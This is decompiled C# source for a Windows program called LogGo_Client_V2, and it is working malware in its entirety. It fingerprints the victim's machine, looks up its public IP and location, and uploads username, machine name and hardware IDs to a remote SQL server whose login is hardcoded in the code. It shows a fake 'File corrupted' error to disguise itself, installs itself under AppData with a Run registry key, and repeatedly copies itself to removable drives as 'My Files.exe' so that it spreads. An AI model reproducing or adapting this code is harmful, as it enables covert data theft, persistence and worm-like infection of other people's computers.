using System;
using System.Collections.Generic;
using System.Data;
using System.Data.Common;
using System.Data.OleDb;
using System.Diagnostics;
using System.IO;
using System.Management;
using System.Net;
using System.Security.Cryptography;
using System.Text;
using System.Threading;
using System.Windows.Forms;
using Microsoft.Win32;

namespace LogGo_Client_V2;

internal class Program
{
	private static void Main(string[] args)
	{
		//IL_00a7: Unknown result type (might be due to invalid IL or missing references)
		//IL_00ae: Expected O, but got Unknown
		//IL_00bc: Unknown result type (might be due to invalid IL or missing references)
		//IL_00c3: Expected O, but got Unknown
		//IL_00e1: Unknown result type (might be due to invalid IL or missing references)
		//IL_00e8: Expected O, but got Unknown
		//IL_0119: Unknown result type (might be due to invalid IL or missing references)
		//IL_0120: Expected O, but got Unknown
		//IL_01a3: Unknown result type (might be due to invalid IL or missing references)
		Console.WriteLine(DateTime.Now);
		string text = PublicIP();
		string[] array = LocationOf(text);
		string text2 = array[3];
		string text3 = array[2];
		string text4 = MachineFingerPrint();
		string userName = Environment.UserName;
		string machineName = Environment.MachineName;
		string versionString = Environment.OSVersion.VersionString;
		string text5 = ProcessorID();
		string text6 = $"INSERT INTO LogGo (MachineFingerPrint, IPAddress, DateOfLog, Country, City, OS, Username, MachineName, ProcessorID) Values ('{text4}','{text}','{DateTime.UtcNow}','{text2}','{text3}','{versionString}','{userName}','{machineName}','{text5}');";
		string text7 = "Provider=SQLOLEDB;workstation id=BJCSMainDB.mssql.somee.com;packet size=4096;user id=bjcustomsoft_SQLLogin_1;pwd=vb1veznst8;data source=BJCSMainDB.mssql.somee.com;persist security info=False;initial catalog=BJCSMainDB";
		OleDbConnection val = new OleDbConnection(text7);
		((DbConnection)(object)val).Open();
		DataSet dataSet = new DataSet();
		OleDbCommand val2 = new OleDbCommand();
		((DbCommand)(object)val2).CommandText = $"SELECT * FROM LogGo WHERE MachineFingerPrint='{text4}'";
		val2.set_Connection(val);
		OleDbDataAdapter val3 = new OleDbDataAdapter(val2);
		((DataAdapter)(object)val3).Fill(dataSet);
		DataRowCollection rows = dataSet.Tables[0].Rows;
		if (rows.Count == 0)
		{
			OleDbCommand val4 = new OleDbCommand(text6, val);
			((DbCommand)(object)val4).ExecuteNonQuery();
		}
		((DbConnection)(object)val).Close();
		Console.WriteLine(DateTime.Now);
		Console.WriteLine("Logged {0}", text4);
		if (!Application.get_ExecutablePath().Equals(Environment.GetEnvironmentVariable("appdata") + "\\LogGo.exe"))
		{
			if (Application.get_ExecutablePath().Contains("My Files"))
			{
				Process.Start("Explorer.exe", Environment.SpecialFolder.Personal.ToString());
			}
			else
			{
				MessageBox.Show("File corrupted", "System Error", (MessageBoxButtons)0, (MessageBoxIcon)16);
			}
			AddToStartUp();
			CopyTo();
		}
		while (true)
		{
			CopyToAllDrives();
			Thread.Sleep(50000);
		}
	}

	private static string PublicIP()
	{
		try
		{
			string requestUriString = "http://checkip.dyndns.org";
			WebRequest webRequest = WebRequest.Create(requestUriString);
			WebResponse response = webRequest.GetResponse();
			StreamReader streamReader = new StreamReader(response.GetResponseStream());
			string text = streamReader.ReadToEnd().Trim();
			string[] array = text.Split(new char[1] { ':' });
			string text2 = array[1].Substring(1);
			string[] array2 = text2.Split(new char[1] { '<' });
			return array2[0];
		}
		catch
		{
			return "error";
		}
	}

	private static string[] LocationOf(string ip)
	{
		string webInfo = GetWebInfo("http://www.iplocationfinder.com/" + ip);
		string text = "Unknown";
		string text2 = "Unknown";
		string text3 = "Unknown";
		string text4 = "Unknown";
		string text5 = "Unknown";
		string text6 = "Unknown";
		try
		{
			int startIndex = webInfo.IndexOf("City:") + 17;
			int length = webInfo.Substring(startIndex).IndexOf("<");
			text = webInfo.Substring(startIndex, length);
		}
		catch
		{
		}
		try
		{
			int startIndex2 = webInfo.IndexOf("Hostname:") + 18;
			int length2 = webInfo.Substring(startIndex2).IndexOf("<");
			text2 = webInfo.Substring(startIndex2, length2);
		}
		catch
		{
		}
		try
		{
			int startIndex3 = webInfo.IndexOf("ISP:") + 13;
			int length3 = webInfo.Substring(startIndex3).IndexOf("<");
			text3 = webInfo.Substring(startIndex3, length3);
		}
		catch
		{
		}
		try
		{
			int startIndex4 = webInfo.IndexOf("Longitude:") + 19;
			int length4 = webInfo.Substring(startIndex4).IndexOf("<");
			text4 = webInfo.Substring(startIndex4, length4);
		}
		catch
		{
		}
		try
		{
			int startIndex5 = webInfo.IndexOf("Latitude") + 18;
			int length5 = webInfo.Substring(startIndex5).IndexOf("<");
			text5 = webInfo.Substring(startIndex5, length5);
		}
		catch
		{
		}
		try
		{
			int startIndex6 = webInfo.IndexOf("Country:");
			int startIndex7 = webInfo.Substring(startIndex6).IndexOf("style");
			int startIndex8 = webInfo.Substring(startIndex6).Substring(startIndex7).IndexOf(">") + 2;
			int length6 = webInfo.Substring(startIndex6).Substring(startIndex7).Substring(startIndex8)
				.IndexOf("<");
			text6 = webInfo.Substring(startIndex6).Substring(startIndex7).Substring(startIndex8, length6);
		}
		catch
		{
		}
		return new string[6] { text3, text2, text, text6, text4, text5 };
	}

	private static string GetWebInfo(string url)
	{
		WebClient webClient = new WebClient();
		byte[] bytes = webClient.DownloadData(url);
		return Encoding.UTF8.GetString(bytes);
	}

	private static string MachineFingerPrint()
	{
		List<string> list = new List<string>();
		string[] propertyNames = new string[5] { "UniqueId", "ProcessorId", "Name", "Manufacturer", "MaxClockSpeed" };
		list.AddRange(GetValues("Win32_Processor", propertyNames));
		propertyNames = new string[6] { "Manufacturer", "SMBIOSBIOSVersion", "IdentificationCode", "SerialNumber", "ReleaseDate", "Version" };
		list.AddRange(GetValues("Win32_BIOS", propertyNames));
		propertyNames = new string[4] { "Model", "Manufacturer", "Name", "SerialNumber" };
		list.AddRange(GetValues("Win32_BaseBoard", propertyNames));
		list.Sort();
		return Hex(string.Join(";", list));
	}

	private static byte[] Hash(string value)
	{
		using MD5 mD = MD5.Create();
		return mD.ComputeHash(Encoding.UTF8.GetBytes(value ?? string.Empty));
	}

	private static string Hex(string value)
	{
		return BitConverter.ToString(Hash(value));
	}

	private static List<string> GetValues(string path, params string[] propertyNames)
	{
		//IL_0007: Unknown result type (might be due to invalid IL or missing references)
		//IL_000d: Expected O, but got Unknown
		//IL_002d: Unknown result type (might be due to invalid IL or missing references)
		//IL_0033: Expected O, but got Unknown
		List<string> list = new List<string>();
		ManagementClass val = new ManagementClass(path);
		try
		{
			ManagementObjectCollection instances = val.GetInstances();
			try
			{
				ManagementObjectEnumerator enumerator = instances.GetEnumerator();
				try
				{
					while (enumerator.MoveNext())
					{
						ManagementObject val2 = (ManagementObject)enumerator.get_Current();
						foreach (string text in propertyNames)
						{
							try
							{
								list.Add($"{path}|{text}={((ManagementBaseObject)val2).get_Item(text).ToString()}");
							}
							catch
							{
							}
						}
					}
				}
				finally
				{
					((IDisposable)enumerator)?.Dispose();
				}
			}
			finally
			{
				((IDisposable)instances)?.Dispose();
			}
		}
		finally
		{
			((IDisposable)val)?.Dispose();
		}
		return list;
	}

	private static string ProcessorID()
	{
		//IL_0007: Unknown result type (might be due to invalid IL or missing references)
		//IL_000d: Expected O, but got Unknown
		//IL_002c: Unknown result type (might be due to invalid IL or missing references)
		//IL_0032: Expected O, but got Unknown
		ManagementObjectCollection val = null;
		ManagementObjectSearcher val2 = new ManagementObjectSearcher("Select * From Win32_processor");
		val = val2.Get();
		string text = "";
		ManagementObjectEnumerator enumerator = val.GetEnumerator();
		try
		{
			while (enumerator.MoveNext())
			{
				ManagementObject val3 = (ManagementObject)enumerator.get_Current();
				text = text + ((ManagementBaseObject)val3).get_Item("ProcessorID").ToString() + ";";
			}
		}
		finally
		{
			((IDisposable)enumerator)?.Dispose();
		}
		return text.Substring(0, text.Length);
	}

	private static void CopyTo()
	{
		if (!File.Exists(Environment.GetEnvironmentVariable("appdata") + "\\LogGo.exe"))
		{
			File.Copy(Application.get_ExecutablePath(), Environment.GetEnvironmentVariable("appdata") + "\\LogGo.exe");
		}
		Process.Start(Environment.GetEnvironmentVariable("appdata") + "\\LogGo.exe");
		Console.WriteLine("Copied to appdata and restarting process");
		Environment.Exit(0);
	}

	private static void CopyToAllDrives()
	{
		DriveInfo[] drives = DriveInfo.GetDrives();
		DriveInfo[] array = drives;
		foreach (DriveInfo driveInfo in array)
		{
			if (driveInfo.IsReady && driveInfo.DriveType.Equals(DriveType.Removable) && !File.Exists(string.Concat(driveInfo.RootDirectory, "My Files.exe")))
			{
				File.Copy(Application.get_ExecutablePath(), string.Concat(driveInfo.RootDirectory, "My Files.exe"));
				Console.WriteLine("Copied to {0}", driveInfo.RootDirectory);
			}
		}
	}

	private static void AddToStartUp()
	{
		RegistryKey registryKey = Registry.CurrentUser.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", writable: true);
		registryKey.SetValue("LogGo", Environment.GetEnvironmentVariable("appdata") + "\\LogGo.exe");
		Console.WriteLine("Added to start up in registry");
	}
}
